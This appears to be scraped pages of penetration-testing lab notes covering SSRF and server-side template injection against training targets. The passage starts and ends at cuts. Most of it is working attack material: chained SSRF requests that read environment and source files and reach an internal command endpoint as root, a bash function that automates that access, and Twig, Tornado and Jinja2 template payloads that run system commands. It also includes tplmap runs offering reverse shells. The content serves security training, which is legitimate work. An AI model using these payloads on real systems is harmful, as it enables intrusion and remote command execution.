\\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive <3 ________________________________________________ :: Method : GET :: URL : http://<TARGET IP>/load?q=http://internal.app.local/load?q=http::////127.0.0.1:PORT :: Wordlist : PORT: ./ports.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405 :: Filter : Regexp: Errno[[:blank:]]111 ________________________________________________ 80 [Status: 200, Size: 153, Words: 5, Lines: 6] 5000 [Status: 200, Size: 123, Words: 3, Lines: 5] :: Progress: [65535/65535] :: Job [1/1] :: 249 req/sec :: Duration: [0:04:06] :: Errors: 0 :: We have found another application listening on port 5000. In this case, the application responds with a list of files. hrmns@htb[/htb]$ curl -i -s \"http://<TARGET IP>/load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/\" HTTP/1.0 200 OK Content-Type: text/html; charset=utf-8 Content-Length: 385 Server: Werkzeug/2.0.2 Python/3.8.12 Date: Tue, 19 Oct 2021 20:30:07 GMT <html><body><h1>Resource: http://127.0.0.1:5000/</h1><a>total 24K drwxr-xr-x 1 root root 4.0K Oct 19 20:29 . drwxr-xr-x 1 root root 4.0K Oct 19 20:29 .. -rw-r--r-- 1 root root 84 Oct 19 16:32 index.html -rw-r--r-- 1 root root 1.2K Oct 19 16:32 internal.py -rw-r--r-- 1 root root 691 Oct 19 20:29 internal_local.py -rwxr-xr-x 1 root root 69 Oct 19 16:32 start.sh </a></body></html> Let us now uncover the source code of the web applications listening on internal.app.local to see how we can achieve remote code execution. Let us issue a request to disclose /proc/self/environ file, where the current path should be present under the PWD environment variable. hrmns@htb[/htb]$ curl -i -s \"http://<TARGET IP>/load?q=http://internal.app.local/load?q=file:://///proc/self/environ\" -o - HTTP/1.0 200 OK Content-Type: text/html; charset=utf-8 Content-Length: 584 Server: Werkzeug/2.0.2 Python/3.8.12 Date: Tue, 19 Oct 2021 16:52:20 GMT <html><body><h1>Resource: file:///proc/self/environ</h1><a>HOSTNAME=18f236843662PYTHON_VERSION=3.8.12PWD=/appPORT=80PYTHON_SETUPTOOLS_VERSION=57.5.0HOME=/rootLANG=C.UTF-8GPG_KEY=E3FF2839C048B25C084DEBE9B26995E310250568SHLVL=0PYTHON_PIP_VERSION=21.2.4PYTHON_GET_PIP_SHA256=01249aa3e58ffb3e1686b7141b4e9aac4d398ef4ac3012ed9dff8dd9f685ffe0PYTHON_GET_PIP_URL=https://github.com/pypa/get-pip/raw/d781367b97acf0ece7e9e304bf281e99b618bf10/public/get-pip.pyPATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin_=/usr/local/bin/python3</a></body></html> Now we know that the current path is /app , and we have a list of interesting files. Let's disclose the internal_local.py file as follows. hrmns@htb[/htb]$ curl -i -s \"http://<TARGET IP>/load?q=http://internal.app.local/load?q=file:://///app/internal_local.py\" HTTP/1.0 200 OK Content-Type: text/html; charset=utf-8 Content-Length: 771 Server: Werkzeug/2.0.2 Python/3.8.12 Date: Tue, 19 Oct 2021 20:40:28 GMT <html><body><h1>Resource: file:///app/internal_local.py</h1><a>import os from flask import * import urllib import subprocess basedir = os.path.abspath(os.path.dirname(__file__)) app = Flask(__name__) def run_command(command): p = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE) stdout = p.stdout.read() stderr = p.stderr.read() result = stdout.decode() + \" \" + stderr.decode() return result @app.route(\"/\") def index(): return run_command(\"ls -lha\") @app.route(\"/runme\") def runmewithargs(): command = request.args.get(\"x\") if command == \"\": return \"Use /runme?x=<CMD>\" return run_command(command) if __name__ == \"__main__\": app.run(host=\"127.0.0.1\", port=5000) </a></body></html> We notice a functionality that allows us to execute commands on the remote host sending a GET request to/runme?x=<CMD> . Let us confirm remote code execution by sending whoami as a command. hrmns@htb[/htb]$ curl -i -s \"http://<TARGET IP>/load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=whoami\" HTTP/1.0 200 OK Content-Type: text/html; charset=utf-8 Content-Length: 93 Server: Werkzeug/2.0.2 Python/3.8.12 Date: Tue, 19 Oct 2021 20:48:32 GMT <html><body><h1>Resource: http://127.0.0.1:5000/runme?x=whoami</h1><a>root </a></body></html> We can execute commands under the superuser context on the target application. But what happens if we try to submit a command with arguments? hrmns@htb[/htb]$ curl -i -s \"http://<TARGET IP>/load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=uname -a\" HTTP/1.0 400 Bad request syntax ('GET /load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=uname -a HTTP/1.1') Connection: close Content-Type: text/html;charset=utf-8 Content-Length: 586 <!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01//EN\" \"http://www.w3.org/TR/html4/strict.dtd\"> <html> <head> <meta http-equiv=\"Content-Type\" content=\"text/html;charset=utf-8\"> <title>Error response</title> </head> <body> <h1>Error response</h1> <p>Error code: 400</p> <p>Message: Bad request syntax ('GET /load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=uname -a HTTP/1.1').</p> <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p> </body> </html> To execute commands with arguments or special characters, we need to encode them. For doing so, you can use any online URL-encoding service such as urlencoder.org . A quick way to achieve this from the terminal also exists. hrmns@htb[/htb]$ sudo apt-get install jq hrmns@htb[/htb]$ echo \"encode me\" | jq -sRr @uri encode%20me%0A We can now create a bash function to automate executing commands on the target application. hrmns@htb [ /htb ] $ function rce () { function > while true ; do function while > echo -n \"# \" ; read cmd function while > ecmd = $( echo -n $cmd | jq -sRr @uri | jq -sRr @uri | jq -sRr @uri ) function while > curl -s -o - \"http://<TARGET IP>/load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x= ${ ecmd } \" function while > echo \"\" function while > done function > } Now we need to call the function and execute commands hrmns@htb[/htb]$ rce # uname -a ; hostname ; whoami <html><body><h1>Resource: http://127.0.0.1:5000/runme?x=uname%20-a%3B%20hostname%3B%20whoami </h1><a>Linux a054d48cc0a4 5.8.0-63-generic #71-Ubuntu SMP Tue Jul 13 15:59:12 UTC 2021 x86_64 GNU/Linux a054d48cc0a4 root </a></body></html>","title":"SSRF Example"},{"location":"server_side_attacks/ssti_example1/","text":"Let us submit on the input field mathematical expressions in curly brackets, starting with {7*7} . It doesn't look like the application evaluated the submitted expression. Let us continue with another expression, ${7*7} this time. It doesn't look like the application evaluated this expression either. What about {{7*7}} ? Luckily this time, the application evaluated the latest mathematical expression. The first thing we need to do when dealing with SSTI vulnerabilities is to identify the template engine the application is utilizing. The next expression the diagram suggests trying is {{7*'7'}} The application successfully evaluated this expression as well. According to PortSwigger's diagram, we are dealing with either a Jinja2 or a Twig template engine. There are template engine-specific payloads that we can use to determine which of the two is being utilized. Let us try with the below Twig-specific one: {{_self.env.display(\"TEST\")}} The Twig-specific payload was evaluated successfully. A Twig template engine is being utilized on the backend. We could have automated the template engine identification process we just executed through tplmap hrmns@htb[/htb]$ git clone https://github.com/epinna/tplmap.git hrmns@htb[/htb]$ cd tplmap hrmns@htb[/htb]$ pip install virtualenv hrmns@htb[/htb]$ virtualenv -p python2 venv hrmns@htb[/htb]$ source venv/bin/activate hrmns@htb[/htb]$ pip install -r requirements.txt hrmns@htb[/htb]$ ./tplmap.py -u 'http://<TARGET IP>:<PORT>' -d name = john [+] Tplmap 0.5 Automatic Server-Side Template Injection Detection and Exploitation Tool [+] Testing if POST parameter 'name' is injectable [+] Smarty plugin is testing rendering with tag '*' [+] Smarty plugin is testing blind injection [+] Mako plugin is testing rendering with tag '${*}' [+] Mako plugin is testing blind injection [+] Python plugin is testing rendering with tag 'str(*)' [+] Python plugin is testing blind injection [+] Tornado plugin is testing rendering with tag '{{*}}' [+] Tornado plugin is testing blind injection [+] Jinja2 plugin is testing rendering with tag '{{*}}' [+] Jinja2 plugin is testing blind injection [+] Twig plugin is testing rendering with tag '{{*}}' [+] Twig plugin has confirmed injection with tag '{{*}}' [+] Tplmap identified the following injection point: POST parameter: name Engine: Twig Injection: {{*}} Context: text OS: Linux Technique: render Capabilities: Shell command execution: ok Bind and reverse shell: ok File write: ok File read: ok Code evaluation: ok, php code [+] Rerun tplmap providing one of the following options: --os-shell Run shell on the target --os-cmd Execute shell commands --bind-shell PORT Connect to a shell bind to a target port --reverse-shell HOST PORT Send a shell back to the attacker's port --upload LOCAL REMOTE Upload files to the server --download REMOTE LOCAL Download remote files The next step is to gain remote code execution on the target server. we can use the getFilter function as it allows execution of a user-defined function via the following process: Register a function as a filter callback via registerUndefinedFilterCallback Invoke _self.env.getFilter() to execute the function we have just registered Payload {{_self.env.registerUndefinedFilterCallback(\"system\")}}{{_self.env.getFilter(\"id;uname -a;hostname\")}} Let's submit the payload using cURL this time. hrmns@htb[/htb]$ curl -X POST -d 'name={{_self.env.registerUndefinedFilterCallback(\"system\")}}{{_self.env.getFilter(\"id;uname -a;hostname\")}}' http://<TARGET IP>:<PORT> <!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.1//EN\" \"http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd\"> <html> <head> <link rel=\"stylesheet\" type=\"text/css\" href=\"css/default.css\" media=\"screen\"/> <title>SSTI</title> </head> <body> <div class=\"container\"> <div class=\"main\"> <div class=\"header\"> <div class=\"title\"> <h1>I'm here to say hello</h1> </div> </div> <div class=\"content\"> <a> Who are you? <form method='post' action=''> <div class=\"form-group\"> <input placeholder=\"Name\" name=\"name\" size=70></input> <button class=\"btn btn-default\" type=\"submit\" name='submit'>Send</button> </div> </form> Hello uid=0(root) gid=0(root) groups=0(root) Linux serversideattackssstitwig-60784-78bd58b5b-pmvvv 4.19.0-17-cloud-amd64 #1 SMP Debian 4.19.194-3 (2021-07-18) x86_64 GNU/Linux serversideattackssstitwig-60784-78bd58b5b-pmvvv serversideattackssstitwig-60784-78bd58b5b-pmvvv!</a> </div> <div class=\"clearer\"><span></span></div> </div> <div class=\"footer\">Break me!</div> </div> </body> The submitted payload was evaluated, and the specified commands ( id , uname -a , and hostname ) were executed successfully. Automating the template engine exploitation process through tplmap hrmns@htb[/htb]$ ./tplmap.py -u 'http://<TARGET IP>:<PORT>' -d name = john --os-shell [+] Tplmap 0.5 Automatic Server-Side Template Injection Detection and Exploitation Tool [+] Testing if POST parameter 'name' is injectable [+] Smarty plugin is testing rendering with tag '*' [+] Smarty plugin is testing blind injection [+] Mako plugin is testing rendering with tag '${*}' [+] Mako plugin is testing blind injection [+] Python plugin is testing rendering with tag 'str(*)' [+] Python plugin is testing blind injection [+] Tornado plugin is testing rendering with tag '{{*}}' [+] Tornado plugin is testing blind injection [+] Jinja2 plugin is testing rendering with tag '{{*}}' [+] Jinja2 plugin is testing blind injection [+] Twig plugin is testing rendering with tag '{{*}}' [+] Twig plugin has confirmed injection with tag '{{*}}' [+] Tplmap identified the following injection point: POST parameter: name Engine: Twig Injection: {{*}} Context: text OS: Linux Technique: render Capabilities: Shell command execution: ok Bind and reverse shell: ok File write: ok File read: ok Code evaluation: ok, php code [+] Run commands on the operating system. Linux $ We can now execute any command of our choosing through the shell tplmap established for us!","title":"SSTI Example1"},{"location":"server_side_attacks/ssti_example2/","text":"If you inspect the application's traffic using Firefox's Web Developer Tools ( [Ctrl]+[Shift]+[I] ), you will notice that user input is submitted inside a parameter called email and through a POST request to http://<TARGET IP>:<PORT>/jointheteam Submit mathematical expressions in curly brackets to the input field, starting with ${7*7} hrmns@htb[/htb]$ curl -X POST -d 'email=${7*7}' http://<TARGET IP>:<PORT>/jointheteam <html> <head> <style> form { margin: 0 auto; width: 200; } </style> </head> <body> <h1 style=\"text-align: center;\">~ Damn Hackers ~</h1> <h2 style=\"text-align: center;\">Gentlemen, we can rebuild it <br />We have the technology <br />We have the capability to make the worlds first bionic website<br />Better than it was before <br />Better, Stronger, Faster.</h2> <h2 style=\"text-align: center;\"><em>Great!</em></h2> <h3 style=\"text-align: center;\"><em>Email ${7*7} has been subscribed. You&#39;ll hear from us soon!</em></h3> </body> It doesn't look like the application evaluated the submitted expression. Let's try {{7*7}} hrmns@htb[/htb]$ curl -X POST -d 'email={{7*7}}' http://<TARGET IP>:<PORT>/jointheteam <html> <head> <style> form { margin: 0 auto; width: 200; } </style> </head> <body> <h1 style=\"text-align: center;\">~ Damn Hackers ~</h1> <h2 style=\"text-align: center;\">Gentlemen, we can rebuild it <br />We have the technology <br />We have the capability to make the worlds first bionic website<br />Better than it was before <br />Better, Stronger, Faster.</h2> <h2 style=\"text-align: center;\"><em>Great!</em></h2> <h3 style=\"text-align: center;\"><em>Email 49 has been subscribed. You&#39;ll hear from us soon!</em></h3> </body> The application evaluated the submitted expression this time. Let's continue, as PortSwigger's diagram suggests, to identify the underlying template engine. hrmns@htb[/htb]$ curl -X POST -d 'email={{7*' 7 '}}' http://<TARGET IP>:<PORT>/jointheteam <html> <head> <style> form { margin: 0 auto; width: 200; } </style> </head> <body> <h1 style=\"text-align: center;\">~ Damn Hackers ~</h1> <h2 style=\"text-align: center;\">Gentlemen, we can rebuild it <br />We have the technology <br />We have the capability to make the worlds first bionic website<br />Better than it was before <br />Better, Stronger, Faster.</h2> <h2 style=\"text-align: center;\"><em>Great!</em></h2> <h3 style=\"text-align: center;\"><em>Email 49 has been subscribed. You&#39;ll hear from us soon!</em></h3> </body> The application evaluated the latest expression we submitted. So, according to the diagram, we should be dealing with a Twig or Jinja2 template engine, right? Unfortunately, this is not the case! If we submit any Twig or Jinja2-specific payload, the application returns 500: Internal Server Error . Find some examples of this behavior below. hrmns@htb[/htb]$ curl -X POST -d 'email={{_self.env.display(\"TEST\"}}' http://<TARGET IP>:<PORT>/jointheteam <html><title>500: Internal Server Error</title><body>500: Internal Server Error</body></html> hrmns@htb[/htb]$ curl -X POST -d 'email={{config.items()}}' http://<TARGET IP>:<PORT>/jointheteam <html><title>500: Internal Server Error</title><body>500: Internal Server Error</body></html> hrmns@htb[/htb]$ curl -X POST -d 'email={{ [].class.base.subclasses() }}' http://<TARGET IP>:<PORT>/jointheteam <html><title>500: Internal Server Error</title><body>500: Internal Server Error</body></html> Payloads utilized can be found at: PayloadsAllTheThings - Template Injection and HackTricks- SSTI (Server Side Template Injection) We could compile a list of template engine-specific payloads from the abovementioned resources and fuzz the application until we conclude on the template engine being used. Eventually, when submitting Tornado -specific payloads, we will come across the below. hrmns@htb[/htb]$ curl -X POST -d \"email={% import os %}{{os.system('whoami')}}\" http://<TARGET IP>:<PORT>/jointheteam <html> <head> <style> form { margin: 0 auto; width: 200; } </style> </head> <body> <h1 style=\"text-align: center;\">~ Damn Hackers ~</h1> <h2 style=\"text-align: center;\">Gentlemen, we can rebuild it <br />We have the technology <br />We have the capability to make the worlds first bionic website<br />Better than it was before <br />Better, Stronger, Faster.</h2> <h2 style=\"text-align: center;\"><em>Great!</em></h2> <h3 style=\"text-align: center;\"><em>Email 0 has been subscribed. You&#39;ll hear from us soon!</em></h3> </body> Tornado is being utilized on the backend. tplmap can be used to automate both the template engine identification and exploitation process. hrmns@htb[/htb]$ ./tplmap.py -u 'http://<TARGET IP>:<PORT>/jointheteam' -d email = blah Automatic Server-Side Template Injection Detection and Exploitation Tool [+] Testing if POST parameter 'email' is injectable [+] Smarty plugin is testing rendering with tag '*' [+] Smarty plugin is testing blind injection [+] Mako plugin is testing rendering with tag '${*}' [+] Mako plugin is testing blind injection [+] Python plugin is testing rendering with tag 'str(*)' [+] Python plugin is testing blind injection [+] Tornado plugin is testing rendering with tag '{{*}}' [+] Tornado plugin has confirmed injection with tag '{{*}}' [+] Tplmap identified the following injection point: POST parameter: email Engine: Tornado Injection: {{*}} Context: text OS: posix-linux Technique: render Capabilities: Shell command execution: ok Bind and reverse shell: ok File write: ok File read: ok Code evaluation: ok, python code [+] Rerun tplmap providing one of the following options: --os-shell Run shell on the target --os-cmd Execute shell commands --bind-shell PORT Connect to a shell bind to a target port --reverse-shell HOST PORT Send a shell back to the attacker's port --upload LOCAL REMOTE Upload files to the server --download REMOTE LOCAL Download remote files","title":"SSTI Example2"},{"location":"server_side_attacks/ssti_example3/","text":"User input is submitted via the cmd parameter through a GET request. Let's submit mathematical expressions in curly brackets in the input field, starting with {7*7} . hrmns@htb[/htb]$ curl -gs \"http://<TARGET IP>:<PORT>/execute?cmd={7*7}\" <!DOCTYPE html> <html lang=\"en\"> <style type=\"text/css\"> # command { resize: horizontal; background-color : transparent; border-color: transparent; font-size: 15px; width: 200px; } # command:active { width: auto; } </style> <head> <meta charset=\"utf-8\"> <meta http-equiv=\"x-ua-compatible\" content=\"ie=edge\"> <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\" /> <link rel=\"stylesheet\" href=\"/static/css/jquery-ui.css\"> <script src=\"/static/js/jquery-1.12.4.js\"></script> <script src=\"/static/js/jquery-ui.js\"></script> <script src=\"/static/js/script.js\"></script> <link rel=\"stylesheet\" type=\"text/css\" href=\"/static/css/style.css\" /> <title>Windows</title> </head> <body> <div id=\"desktop\"> <div class=\"window\" data-title=\"Run\"> <form action=\"/execute\" method=\"get\"> <a>C:\\><input type=\"text\" name=\"cmd\" id=\"command\"></a> <br/> <a>{7*7}</a> <br/> <input type=\"submit\" value=\"execute\"> </form> </div> <div class=\"window\" data-title=\"Windows\"> <h1>Windows</h1> <p>Minimize the windows to the taskbar, make them full screen or close them.</p> <p>Drag the title bar to move the windows or resize them from the bottom right corner.</p> </div> <div id=\"taskbar\"> </div> <div id=\"icons\"> <a class=\"openWindow\" data-id=\"0\">Run</a> <a class=\"openWindow\" data-id=\"1\">Welcome</a> </div> <font size=\"5px\"><a href=\"https://html5-templates.com/\" rel=\"nofollow\" target=\"_blank\" id=\"templateLink\">&copy; HTML5-Templates.com</a></font> <!-- You can use this template freely if you leave a visible link to HTML5-Templates.com --> </div> </body> It doesn't look like the application evaluated the submitted expression. Let us continue with another expression, ${7*7} this time. hrmns@htb[/htb]$ curl -gs 'http://<TARGET IP>:<PORT>/execute?cmd=${7*7}' <!DOCTYPE html> <html lang=\"en\"> <style type=\"text/css\"> # command { resize: horizontal; background-color : transparent; border-color: transparent; font-size: 15px; width: 200px; } # command:active { width: auto; } </style> <head> <meta charset=\"utf-8\"> <meta http-equiv=\"x-ua-compatible\" content=\"ie=edge\"> <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\" /> <link rel=\"stylesheet\" href=\"/static/css/jquery-ui.css\"> <script src=\"/static/js/jquery-1.12.4.js\"></script> <script src=\"/static/js/jquery-ui.js\"></script> <script src=\"/static/js/script.js\"></script> <link rel=\"stylesheet\" type=\"text/css\" href=\"/static/css/style.css\" /> <title>Windows</title> </head> <body> <div id=\"desktop\"> <div class=\"window\" data-title=\"Run\"> <form action=\"/execute\" method=\"get\"> <a>C:\\><input type=\"text\" name=\"cmd\" id=\"command\"></a> <br/> <a>${7*7}</a> <br/> <input type=\"submit\" value=\"execute\"> </form> </div> <div class=\"window\" data-title=\"Windows\"> <h1>Windows</h1> <p>Minimize the windows to the taskbar, make them full screen or close them.</p> <p>Drag the title bar to move the windows or resize them from the bottom right corner.</p> </div> <div id=\"taskbar\"> </div> <div id=\"icons\"> <a class=\"openWindow\" data-id=\"0\">Run</a> <a class=\"openWindow\" data-id=\"1\">Welcome</a> </div> <font size=\"5px\"><a href=\"https://html5-templates.com/\" rel=\"nofollow\" target=\"_blank\" id=\"templateLink\">&copy; HTML5-Templates.com</a></font> <!-- You can use this template freely if you leave a visible link to HTML5-Templates.com --> </div> </body> It doesn't look like the application evaluated this expression either. What about {{7*7}} ? hrmns@htb[/htb]$ curl -gs \"http://<TARGET IP>:<PORT>/execute?cmd={{7*7}}\" <!DOCTYPE html> <html lang=\"en\"> <style type=\"text/css\"> # command { resize: horizontal; background-color : transparent; border-color: transparent; font-size: 15px; width: 200px; } # command:active { width: auto; } </style> <head> <meta charset=\"utf-8\"> <meta http-equiv=\"x-ua-compatible\" content=\"ie=edge\"> <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\" /> <link rel=\"stylesheet\" href=\"/static/css/jquery-ui.css\"> <script src=\"/static/js/jquery-1.12.4.js\"></script> <script src=\"/static/js/jquery-ui.js\"></script> <script src=\"/static/js/script.js\"></script> <link rel=\"stylesheet\" type=\"text/css\" href=\"/static/css/style.css\" /> <title>Windows</title> </head> <body> <div id=\"desktop\"> <div class=\"window\" data-title=\"Run\"> <form action=\"/execute\" method=\"get\"> <a>C:\\><input type=\"text\" name=\"cmd\" id=\"command\"></a> <br/> <a>49</a> <br/> <input type=\"submit\" value=\"execute\"> </form> </div> <div class=\"window\" data-title=\"Windows\"> <h1>Windows</h1> <p>Minimize the windows to the taskbar, make them full screen or close them.</p> <p>Drag the title bar to move the windows or resize them from the bottom right corner.</p> </div> <div id=\"taskbar\"> </div> <div id=\"icons\"> <a class=\"openWindow\" data-id=\"0\">Run</a> <a class=\"openWindow\" data-id=\"1\">Welcome</a> </div> <font size=\"5px\"><a href=\"https://html5-templates.com/\" rel=\"nofollow\" target=\"_blank\" id=\"templateLink\">&copy; HTML5-Templates.com</a></font> <!-- You can use this template freely if you leave a visible link to HTML5-Templates.com --> </div> </body> Luckily this time, the application evaluated the latest mathematical expression we submitted and returned the result, 49. It looks like we may be dealing with an SSTI vulnerability! As already mentioned, the first thing we need to do when dealing with SSTI vulnerabilities is to identify the template engine the application is utilizing. Once again, let's use PortSwigger's diagram in the SSTI Identification. We already know that the {{7*7}} expression was evaluated successfully. The next expression the diagram suggests trying is {{7*'7'}} . Let us try it and see how the application responds. hrmns@htb[/htb]$ curl -gs \"http://<TARGET IP>:<PORT>/execute?cmd={{7*'7'}}\" <!DOCTYPE html> <html lang=\"en\"> <style type=\"text/css\"> # command { resize: horizontal; background-color : transparent; border-color: transparent; font-size: 15px; width: 200px; } # command:active { width: auto; } </style> <head> <meta charset=\"utf-8\"> <meta http-equiv=\"x-ua-compatible\" content=\"ie=edge\"> <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\" /> <link rel=\"stylesheet\" href=\"/static/css/jquery-ui.css\"> <script src=\"/static/js/jquery-1.12.4.js\"></script> <script src=\"/static/js/jquery-ui.js\"></script> <script src=\"/static/js/script.js\"></script> <link rel=\"stylesheet\" type=\"text/css\" href=\"/static/css/style.css\" /> <title>Windows</title> </head> <body> <div id=\"desktop\"> <div class=\"window\" data-title=\"Run\"> <form action=\"/execute\" method=\"get\"> <a>C:\\><input type=\"text\" name=\"cmd\" id=\"command\"></a> <br/> <a>7777777</a> <br/> <input type=\"submit\" value=\"execute\"> </form> </div> <div class=\"window\" data-title=\"Windows\"> <h1>Windows</h1> <p>Minimize the windows to the taskbar, make them full screen or close them.</p> <p>Drag the title bar to move the windows or resize them from the bottom right corner.</p> </div> <div id=\"taskbar\"> </div> <div id=\"icons\"> <a class=\"openWindow\" data-id=\"0\">Run</a> <a class=\"openWindow\" data-id=\"1\">Welcome</a> </div> <font size=\"5px\"><a href=\"https://html5-templates.com/\" rel=\"nofollow\" target=\"_blank\" id=\"templateLink\">&copy; HTML5-Templates.com</a></font> <!-- You can use this template freely if you leave a visible link to HTML5-Templates.com --> </div> </body> The application successfully evaluated this expression as well. According to PortSwigger's diagram, we are dealing with either a Jinja2 or a Twig template engine. That being said, the fact that {{7*'7'}} was evaluated with the application returning 7777777 means that Jinja2 is being utilized on the backend. We could have automated the template engine identification process we just executed through tplmap : hrmns@htb[/htb]$ ./tplmap.py -u 'http://<TARGET IP>:<PORT>/execute?cmd' Automatic Server-Side Template Injection Detection and Exploitation Tool [+] Testing if GET parameter 'cmd' is injectable [+] Smarty plugin is testing rendering with tag '*' [+] Smarty plugin is testing blind injection [+] Mako plugin is testing rendering with tag '${*}' [+] Mako plugin is testing blind injection [+] Python plugin is testing rendering with tag 'str(*)' [+] Python plugin is testing blind injection [+] Tornado plugin is testing rendering with tag '{{*}}' [+] Tornado plugin is testing blind injection [+] Jinja2 plugin is testing rendering with tag '{{*}}' [+] Jinja2 plugin has confirmed injection with tag '{{*}}' [+] Tplmap identified the following injection point: GET parameter: cmd Engine: Jinja2 Injection: {{*}} Context: text OS: posix-linux Technique: render Capabilities: Shell command execution: ok Bind and reverse shell: ok File write: ok File read: ok Code evaluation: ok, python code [+] Rerun tplmap providing one of the following options: --os-shell Run shell on the target --os-cmd Execute shell commands --bind-shell PORT Connect to a shell bind to a target port --reverse-shell HOST PORT Send a shell back to the attacker's port --upload LOCAL REMOTE Upload files to the server --download REMOTE LOCAL Download remote files The next step is to gain remote code execution on the target server. Before moving to the payload development part, let's look at some Python for SSTI. Python Primer for SSTI \u00b6 Below is a small dictionary from fatalerrors.org to refer to when going over the Jinja2 payload development part No. Methods Description 1. __class__ Returns the object (class) to which the type belongs 2. __mro__ Returns a tuple containing the base class inherited by the object. Methods are parsed in the order of tuples. 3. __subclasses__ Each new class retains references to subclasses, and this method returns a list of references that are still available in the class 4. __builtins__ Returns the builtin methods included in a function 5. __globals__ A reference to a dictionary that contains global variables for a function 6. __base__ Returns the base class inherited by the object <-- (__ base__ and __ mro__ are used to find the base class) 7. __init__ Class initialization method hrmns@htb[/htb]$ python3 Python 3.9.2 (default, Feb 28 2021, 17:03:44) [GCC 10.2.1 20210110] on linux Type \"help\", \"copyright\", \"credits\" or \"license\" for more information. >>> Create a string object and use type and __class__ , as follows. Then use the dir() command to show all methods and attributes from the object. >>> import flask >>> s = 'HTB' >>> type ( s ) < class ' str '> >>> s . __class__ < class ' str '> >>> dir ( s ) [ '__add__' , '__class__' , '__contains__' , '__delattr__' , '__dir__' , '__doc__' , '__eq__' , '__format__' , '__ge__' , '__getattribute__' , '__getitem__' , '__getnewargs__' , '__gt__' , '__hash__' , '__init__' , '__init_subclass__' , '__iter__' , '__le__' , '__len__' , '__lt__' , '__mod__' , '__mul__' , '__ne__' , '__new__' , '__reduce__' , '__reduce_ex__' , '__repr__' , '__rmod__' , '__rmul__' , '__setattr__' , '__sizeof__' , '__str__' , '__subclasshook__' , 'capitalize' , 'casefold' , 'center' , 'count' , 'encode' , 'endswith' , 'expandtabs' , 'find' , 'format' , 'format_map' , 'index' , 'isalnum' , 'isalpha' , 'isascii' , 'isdecimal' , 'isdigit' , 'isidentifier' , 'islower' , 'isnumeric' , 'isprintable' , 'isspace' , 'istitle' , 'isupper' , 'join' , 'ljust' , 'lower' , 'lstrip' , 'maketrans' , 'partition' , 'replace' , 'rfind' , 'rindex' , 'rjust' , 'rpartition' , 'rsplit' , 'rstrip' , 'split' , 'splitlines' , 'startswith' , 'strip' , 'swapcase' , 'title' , 'translate' , 'upper' , 'zfill' ] The next step is to understand Python's hierarchy. Using __mro__ or mro() , we can go back up to three inherited objects in the Python environment. Let's practice this as follows. >>> s . __class__ . __class__ < class ' type '> >>> s . __class__ . __base__ < class ' object '> >>> s . __class__ . __base__ . __subclasses__ () [ < class ' type '>, <class ' weakref '>, <class ' weakcallableproxy '>, <class ' weakproxy '>, <class ' int '>, <class ' bytearray '>, <class ' bytes '>, <class ' list '>, <class ' NoneType '>, <class ' NotImplementedType '>, <class ' traceback '>, <class ' super '>, <class ' range '>, <class ' dict '>, <class ' dict_keys '>, <class ' dict_values '>, <class ' dict_items '>, <class ' dict_reversekeyiterator '>, <class ' dict_reversevalueiterator '>, <class ' dict_reverseitemiterator '>, <class ' odict_iterator '>, <class ' set '>, <class ' str '>, <class ' slice '>, <class ' staticmethod '>, <class ' complex '>, <class ' float '>, <class ' frozenset '>, <class ' property '>, <class ' managedbuffer '>, <class ' memoryview '>, <class ' tuple '>, <class ' enumerate '>, <class ' reversed '>, <class ' stderrprinter '>, <class ' code '>, <class ' frame '>, <class ' builtin_function_or_method '>, <class ' method '>, < SNIP > >>> s . __class__ . mro ()[ 1 ] . __subclasses__ () [ < class ' type '>, <class ' weakref '>, <class ' weakcallableproxy '>, <class ' weakproxy '>, <class ' int '>, <class ' bytearray '>, <class ' bytes '>, <class ' list '>, <class ' NoneType '>, <class ' NotImplementedType '>, <class ' traceback '>, <class ' super '>, <class ' range '>, <class ' dict '>, <class ' dict_keys '>, <class ' dict_values '>, <class ' dict_items '>, <class ' dict_reversekeyiterator '>, <class ' dict_reversevalueiterator '>, <class ' dict_reverseitemiterator '>, <class ' odict_iterator '>, <class ' set '>, <class ' str '>, <class ' slice '>, <class ' staticmethod '>, <class ' complex '>, <class ' float '>, <class ' frozenset '>, <class ' property '>, <class ' managedbuffer '>, <class ' memoryview '>, <class ' tuple '>, <class ' enumerate '>, <class ' reversed '>, <class ' stderrprinter '>, <class ' code '>, <class ' frame '>, <class ' builtin_function_or_method '>, <class ' method '>, < SNIP > Let us look for useful classes that can facilitate remote code execution. >>> x = s . __class__ . mro ()[ 1 ] . __subclasses__ () >>> for i in range ( len ( x )): print ( i , x [ i ] . __name__ ) ... 0 type 1 weakref 2 weakcallableproxy 3 weakproxy 4 int 5 bytearray 6 bytes 7 list 8 NoneType < SNIP > >>> def searchfunc ( name ): ... x = s . __class__ . mro ()[ 1 ] . __subclasses__ () ... for i in range ( len ( x )): ... fn = x [ i ] . __name__ ... if fn . find ( name ) > - 1 : ... print ( i , fn ) ... >>> searchfunc ( 'warning' ) 215 catch_warnings Why are we searching for warning you may ask. We chose this class because it imports Python's sys module , and from sys , the os module can be reached. More precisely, os modules are all from warnings.catch_ . We have seen that catch_warnings is present without importing any additional module to our Python console. Let's enumerate the builtins from this class: >>> y = x [ 215 ] >>> y < class ' warnings . catch_warnings '> >>> y () . _module . __builtins__ { '__name__' : 'builtins' , '__doc__' : \"Built-in functions, exceptions, and other objects. \\n\\n 